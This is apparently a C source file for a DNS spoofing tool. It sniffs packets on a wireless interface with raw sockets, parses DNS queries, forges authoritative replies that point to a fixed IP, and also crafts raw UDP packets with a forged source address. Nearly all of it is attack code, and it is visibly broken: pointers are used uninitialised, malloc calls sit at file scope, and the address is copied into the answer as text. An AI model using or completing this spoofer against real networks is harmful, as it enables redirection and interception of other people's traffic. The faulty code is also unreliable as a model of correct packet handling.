#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>


#include<netinet/ip.h> // iphdr
#include<netinet/udp.h> // udphdr
#include <linux/if_ether.h> // ethhdr


// Custom headers
#include "udpHandler.h"
#include "ipHandler.h"
#include "etherHandler.h"

// Pseudo IP header for UDP checksum calculation
// Sizeof this pseudo_header = 88 bits (11 bytes)
struct pseudo_header
{
	uint32_t source_ip;
	uint32_t dest_ip;
	uint8_t placeholder, protocol;
	uint16_t udp_length;
};

struct ippseudo {
	struct	in_addr	ippseudo_src;	/* source internet address */
	struct	in_addr	ippseudo_dst;	/* destination internet address */
	u_char		ippseudo_pad;	/* pad, must be zero */
	u_char		ippseudo_p;	/* protocol */
	u_short		ippseudo_len;	/* protocol length */
};

///////////////////////////////////////////////////////
// DNS message: DNS header + query
// DNS Header structure
typedef struct
{
unsigned short id;       // identification number
unsigned char rd :1;     // recursion desired
unsigned char tc :1;     // truncated message
unsigned char aa :1;     // authoritive answer
unsigned char opcode :4; // purpose of message
unsigned char qr :1;     // query/response flag
unsigned char rcode :4;  // response code
unsigned char cd :1;     // checking disabled ? not sure about this
unsigned char ad :1;     // authenticated data ? not sure about this
unsigned char z :1;      // its z! reserved ? Should be 3 bits?
unsigned char ra :1;     // recursion available
unsigned short q_count;  // number of question entries
unsigned short ans_count; // number of answer entries
unsigned short auth_count; // number of authority entries
unsigned short add_count; // number of resource entries
} DNS_HEADER;

// Query structure: Not included QNAME which is variable length
typedef struct
{
unsigned short qtype;
unsigned short qclass;
} QUESTION;

// Actual/complete Query structure:
typedef struct
{
	unsigned char *name;
	QUESTION *ques;
} QUERY;
///////////////////////////////////////////////////////////////////
// Structures specific to answer only
#pragma pack(push, 1)
typedef struct
{
	unsigned short type;
	unsigned short _class;
	unsigned int ttl; // ttl is 32 bits
	unsigned short data_len;
} RR_CONSTANT_FIELD;
#pragma pack(pop)

// complete Resource record (RR):
typedef struct 
{
	unsigned char *name;
	RR_CONSTANT_FIELD *resource;
	unsigned char *rdata;
} RES_RECORD;
/////////////////////////////////

unsigned int createSpoofDNS(int *newNameLen, char * orgBuffer, char * Buffer, 
DNS_HEADER * spoofDNSHeader, DNS_HEADER * dnsHeader); 
DNS_HEADER * dnsHeader = (DNS_HEADER *)malloc(sizeof(DNS_HEADER));
struct ethhdr * eHeader = (struct ethhdr *) malloc(sizeof(struct ethhdr));
struct iphdr * ipHeader = (struct iphdr *) malloc(sizeof(struct iphdr));
struct udphdr * udpHeader = (struct udphdr *) malloc(sizeof(struct udphdr));

struct ethhdr * spoofETHHeader = (struct ethhdr *) malloc(sizeof(struct ethhdr));
struct iphdr * spoofIPHeader = (struct iphdr *) malloc(sizeof(struct iphdr));
struct udphdr * spoofUDPHeader = (struct udphdr *) malloc(sizeof(struct udphdr));
	




int parseBuffer(int *newNameLen, char * buffer, unsigned char * mac1);

// Parse and print header information


int printDNSInfo(int *newNameLen, DNS_HEADER *dnsHeader, char * queryName);
char * DNStoNormal(char *name);
int sendSpoofReply(char * newBuffer, struct ethhdr *spoofETHHeader, struct iphdr *spoofIPHeader, 
	struct udphdr *spoofUDPHeader, unsigned int dns_length);

int create_socket()
{
	// create raw UDP socket
	int s;
	if ( (s = socket(AF_PACKET, SOCK_RAW, IPPROTO_UDP)) == -1)
	{
		printf("Creating raw socket failed\n");
		return -1;
	}
	else
	{
		printf("Raw socket created\n");
	}
	
	// Create datagram consisting of IP header, UDP header, and data
	char datagram[4096];
	memset(datagram, 0, sizeof(datagram));
	
	// IP header defined in netinet/ip.h
	struct iphdr *ipheader = (struct iphdr *)datagram;
	
	// UDP headerip
	struct udphdr * udpheader = (struct udphdr *) (datagram + sizeof(struct iphdr));
	
	// Actual data
	char *data;
	data = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);
	strcpy(data, "xyxxiiehgiehgiez");
	
	
	//IP header part
	// Create a socket address for setting IP header
	struct sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(9997);
	sin.sin_addr.s_addr = inet_addr("1.2.3.4");
	
	char source_ip[] = "192.168.1.159";

	// Fill IP header
	ipheader->ihl = 5;
	ipheader->version = 4;
	ipheader->tos = 0;
	ipheader->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + strlen(data);
	ipheader->id = htonl(54321); // id of this packet
	ipheader->frag_off = 0;
	ipheader->ttl = 255;
	ipheader->protocol =IPPROTO_UDP; 
	ipheader->check = 0; // Need to set it to actual checksum after calculation
	ipheader->saddr = inet_addr(source_ip); // Need to set to dns server ip	
	ipheader->daddr = sin.sin_addr.s_addr;
	
	// Calculate checksum now
	// ipheader->check = calc_checksum( (unsigned short *)datagram, ipheader->tot_len );

	// Items in UDP header
	uint16_t source_port = 9997, dest_port;
	uint16_t udp_header_len, udp_checksum;
	
	udpheader->source = htons(9997);
	udpheader->dest = htons(12345);
	udpheader->len = htons(8); // UDP header len = 8 bytes
	udpheader->check = 0; // set to 0 for checksum calculation

	
	
	// Pseudo IP header calculation for UDP
	struct pseudo_header * pheader;
	pheader = (struct pseudo_header*) malloc(sizeof(struct pseudo_header));
	printf("source_ip: %s\n", source_ip);
	struct in_addr temp_addr;
	inet_aton(source_ip, &(temp_addr));
	pheader->source_ip = temp_addr.s_addr;
	pheader->dest_ip = sin.sin_addr.s_addr;
	pheader->placeholder = 0;
	pheader->protocol = IPPROTO_UDP;
	pheader->udp_length = htons(sizeof(struct udphdr) + strlen(data));

	// temporary variable to store the sizeof pheader
	int psize = sizeof(struct pseudo_header) + sizeof(struct udphdr) + strlen(data);
	char *pseudo_datagram = (char *)malloc(psize);
	
	memcpy(pseudo_datagram, (char *)pheader, sizeof(struct pseudo_header));
	memcpy(pseudo_datagram + sizeof(struct pseudo_header), udpheader, sizeof(struct udphdr));
	
	udpheader->check = calc_checksum( (unsigned short*) pseudo_datagram, psize);
	
	// Now setsockopt to inform kernel that IP headers are also included
	int one = 1;
	const int * val = &one;
	errno = 0;
	if ( setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0 )
	{
		printf("setsockopt failed\n");
		fprintf(stderr, "error: %s\n", strerror(errno));
		return -1;
	}
	printf("Entering while loop\n");
	while (1)
	{
		printf("sending packet\n");
		if ( sendto(s, datagram, ipheader->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
		{
			printf("sendto failed\n");
			return -1;
		}
		else
		{
			printf("Sent UDP packet, length: %d\n", ipheader->tot_len);
		}
		usleep(1000*1000);
	}
	

	free(pseudo_datagram);
	free(pheader);
}


int receiveData()
{
	sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(53);
	//sin.sin_addr.s_addr = inet_addr("192.168.2.249");
	sin.sin_addr.s_addr = inet_addr("127.0.0.1");
	//sin.sin_addr.s_addr = htonl(IN_ADDR_ANY);

	int s;
	if ( (s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
	//if ( (s = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
	{
		printf("socket creation failed\n");
		return -1;
	}

	char buffer[4096] = {0};

	int len;
	int sizeSocket = sizeof(sin);
	// Need to bind the socket to the sockaddr_in sin
	if (bind(s, (sockaddr *)&sin, (socklen_t )sizeSocket) < 0)
	{
		printf("Can't bind\n");
		return -1;
	}
	while (1)
	{
		printf("Listening----------\n----------\n");
		if ( (len = recvfrom(s, buffer, sizeof(buffer), 0, 
			(sockaddr *)&sin, (socklen_t* )&sizeSocket)) == -1 )
		{
			printf("receive failed\n");
			return -1;
		}
	}

}

int receiveDataRaw(unsigned char * mac1)
{
	sockaddr_in sin;
	memset((void*)&sin, 0, sizeof(sin));
	//sin.sin_family = AF_INET;
	///sin.sin_addr.s_addr = inet_addr("197.9.0.1");	
	//sin.sin_port = htons(7772); 
	int s;
	//sin.sin_addr.s_addr = htonl(IN_ADDR_ANY); 	
	if ( (s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP))) == -1)
	{
		printf("socket creation failed\n");
		fprintf(stderr,"%s", strerror(errno)); 
		return -1;
	}

	char buffer[65536] = {0};

	int len;
	int sizeSocket = sizeof(sin);

	while (1)
	{
		// printf("Listening----------\n----------\n");
		if ( (len = recvfrom(s, buffer, sizeof(buffer), 0, 
			(sockaddr *)&sin, (socklen_t* )&sizeSocket)) == -1 )
		{
			printf("receive failed\n");
			return -1;
		}
		else
		{
			char newBuffer[65535] = {0};
			int newNameLen = 0;
			if (parseBuffer(&newNameLen, buffer, mac1) == 1)
			{
				
				createSpoofEthhdr(eHeader, spoofETHHeader);
				unsigned int dns_length = 0;
				DNS_HEADER * spoofDNSHeader;
				dns_length = createSpoofDNS(&newNameLen, buffer, newBuffer + sizeof(struct ethhdr)
					+ sizeof(iphdr) + sizeof(udphdr), spoofDNSHeader, dnsHeader);
				unsigned long ipsrc, ipdest;
				unsigned short portsrc = getSrcPort(buffer, &portsrc);
				getIPinfo(buffer, &ipsrc, &ipdest);

				ipHeader = (struct iphdr*) (buffer + sizeof(struct ethhdr));
				udpHeader = (struct udphdr *) (buffer + sizeof(struct ethhdr) + sizeof(struct iphdr));
				createSpoofIPhdr(newBuffer, ipHeader, spoofIPHeader, dns_length);
				createSpoofUDPhdr(udpHeader, spoofUDPHeader, dns_length);
				sendSpoofReply(newBuffer, spoofETHHeader, spoofIPHeader, spoofUDPHeader, dns_length);

			}
			// printf("Len %d bytes received\n", len);
		}

// printMAC:
// 		printf("Source MAC: %.2X:%.2X:%.2X:%.2X:%.2X:%.2X, %d, %d\n", eHeader->h_source[0], 
// 				eHeader->h_source[1], eHeader->h_source[2], eHeader->h_source[3],
// 				eHeader->h_source[4], eHeader->h_source[5], (unsigned char) eHeader->h_source[4], (unsigned char)eHeader->h_source[5]);
// 		printf("Destination MAC: %.2X:%.2X:%.2X:%.2X:%.2X:%.2X, %d, %d\n", eHeader->h_dest[0], 
// 				eHeader->h_dest[1], eHeader->h_dest[2], eHeader->h_dest[3], 	
// 				eHeader->h_dest[4], eHeader->h_dest[5], (unsigned char)eHeader->h_dest[0], (unsigned char)eHeader->h_dest[1]);

	}

}



int sendSpoofReply(char * newBuffer, struct ethhdr *spoofETHHeader, struct iphdr *spoofIPHeader, 
	struct udphdr *spoofUDPHeader, unsigned int dns_length)
{
	int s;
	if ( (s = socket(AF_INET, SOCK_RAW, IPPROTO_IP)) < 0 )
	{
		printf("Raw socket creation failed\n");
		return -1;
	}

	sockaddr_in destAddr;
	destAddr.sin_family = AF_INET;
	destAddr.sin_addr.s_addr = spoofIPHeader->daddr;
	destAddr.sin_port = htons(53);

	if ( sendto(s, newBuffer, sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct udphdr) + 
		dns_length, 0, (sockaddr *) &destAddr, sizeof(destAddr)) == -1)
	{
		printf("Spoof reply send failed\n");
		return -1;
	}

}

unsigned int createSpoofDNS(int *newNameLen, char * orgBuffer, char * newBuffer, DNS_HEADER *header, DNS_HEADER *dnsHeader)
{
	// DNS_HEADER * header = (DNS_HEADER *) newBuffer;

	header->id = dnsHeader->id;
	header->rd = dnsHeader->rd; // recursion desired
	header->tc = 0; // no truncation
	header->aa = 1; // authoritative answer, for response only
	header->opcode = dnsHeader->opcode; // 0 = standard query
	header->qr = 1; // qr is 1 for response only

	header->ra = 0; // no recursion available
	header->z = 0 ; // z is 0
	header->ad = 0; // z is supposed to be 3 bits but we take only 1 bit for z and 
	// rest two for 'ad' and 'cd'	
	header->cd = 0;
	header->rcode = 0; // response code, 0 in queries
	header->q_count = dnsHeader->q_count; // no. of questions
	header->ans_count = 1; // 0 for queries
	header->auth_count = 0;
	header->add_count = 0;

	// Handle qname and QUESTION now
	unsigned char *qname;
	qname = (unsigned char*) (orgBuffer + sizeof(DNS_HEADER));
	// unsigned char temphostname[] = "www.stanford.edu";
	// unsigned char temphostname[] = "www.google.com";
	// ChangetoDnsNameFormat(qname , temphostname);

	// printf("qname is: %s\n", qname);
	// unsigned short tempval = htons(0xffff);
	// qname = (unsigned char*)&tempval; // In DNS format
	// qname = temphostname;

	printf("len of qname: %d\n", (int)strlen((const char*)qname));
	QUESTION * question = (QUESTION *)(orgBuffer + sizeof(DNS_HEADER) + *newNameLen);

	memcpy(newBuffer + sizeof(DNS_HEADER), qname, *newNameLen);

	QUESTION * newQestion = (QUESTION *) (newBuffer + sizeof(DNS_HEADER) + *newNameLen);

	newQestion->qtype = question->qtype; // requesting ipv4 address
	newQestion->qclass = question->qtype; // internet means 1 for class

	// Copy answer part
	RES_RECORD * answerStruct = (RES_RECORD *) (newBuffer + sizeof(DNS_HEADER) + *newNameLen + sizeof(QUESTION));

	memcpy(answerStruct->name, qname, *newNameLen);

	answerStruct->resource->type = htons(1);
	answerStruct->resource->_class = htons(1);
	answerStruct->resource->ttl = htons(34);
	answerStruct->resource->data_len = htons(4); // 4 bytes?

	const char spoofIP[] = "8.8.8.8";
	memcpy(answerStruct->rdata, spoofIP, strlen(spoofIP) + 1);
	

	return (sizeof(DNS_HEADER) + *newNameLen + sizeof(QUESTION) + sizeof(RES_RECORD));
}





int parseBuffer(int *newNameLen, char * buffer, unsigned char * mac1)
{
	// ethhdr
	eHeader = (struct ethhdr *)buffer;

	if ( !memcmp((const void*)mac1, (const void*)eHeader->h_source, ETH_ALEN) )
	{
		printf("MAC source matched with wlan0\n");
		// goto printMAC;
	}
	else if ( !memcmp((const void*)mac1, (const void*)eHeader->h_dest, ETH_ALEN) )
	{
		printf("MAC source matched with wlan0\n");
		// goto printMAC;
	}
	else
	{
		// printf("No match in src or dest MAC\n");
		// continue;
	}

	// iphdr
	ipHeader = (struct iphdr *)(buffer + sizeof(struct ethhdr));
	udpHeader = (struct udphdr *) (buffer + sizeof(struct ethhdr) + sizeof(iphdr));

	if (printUPDheader(udpHeader) == 1)
	{
		dnsHeader = (DNS_HEADER *) (buffer + sizeof(struct ethhdr) + sizeof(iphdr)
								+ sizeof(struct udphdr));
		char *queryName = (char *) (buffer + sizeof(struct ethhdr) + sizeof(iphdr)
								+ sizeof(struct udphdr) + sizeof(DNS_HEADER));

		printIPheader(ipHeader);
		printDNSInfo(newNameLen, dnsHeader, queryName);
		printf("--------------------\n");
		return 1;
	}
	else
		return 0;


}



int printDNSInfo(int *newNameLen, DNS_HEADER *dnsHeader, char * queryName)
{
	printf("dnsHeader->q_count: %d\n", ntohs(dnsHeader->q_count));
	// printf("dnsHeader->dest: %d\n", ntohs(udpHeader->dest));
	// printf("dnsHeader->len: %d\n", ntohs(udpHeader->len));
	// printf("dnsHeader->check: %d\n", ntohs(udpHeader->check));
	char * newName = DNStoNormal(queryName);
	*newNameLen = strlen(newName) + 2; // +2 = 1 for \0 and 1 for the last '.' in dns format
	printf("queryName: %s\n", newName);
	free(newName);
	return 0;
}

char *DNStoNormal(char *name)
{
	char * newName = (char *) malloc(strlen(name) + 1);
	int p;
	int i, j;
    for(i=0;i<(int)strlen((const char*)name);i++)
    {
        p=name[i];
        for(j=0;j<(int)p;j++) 
        // for(j=0;j<p - '0';j++)  // can we use p - '0' ? 
        {
            newName[i]=name[i+1];
            i=i+1;
        }
        newName[i]='.';
    }
    // name[i-1]='\0'; //remove the last dot
    newName[i-1]='\0'; //remove the last dot // i -2 or -1

    // *namelen = strlen(newName);
    return newName;
}





int getSrcPort(char * buffer, unsigned short * portsrc)
{
	struct udphdr * udpHeader = (struct udphdr *)(buffer + sizeof(struct ethhdr) + sizeof(struct iphdr));
	*portsrc = udpHeader->source;

	return 0;
}



int main()
{
	// Get mac addr first 
	unsigned char intf_mac[ETH_ALEN] = {0};
	const char intf[] = "wlan0";
	getMAC(intf, intf_mac);
	printf("%s, MAC: %.2X:%.2X:%.2X:%.2X:%.2X:%.2X\n", intf, intf_mac[0], intf_mac[1], intf_mac[2],
		intf_mac[3], intf_mac[4], intf_mac[5]);
	//create_socket();
	 //receiveData();
	 receiveDataRaw(intf_mac);

	return 0;
}
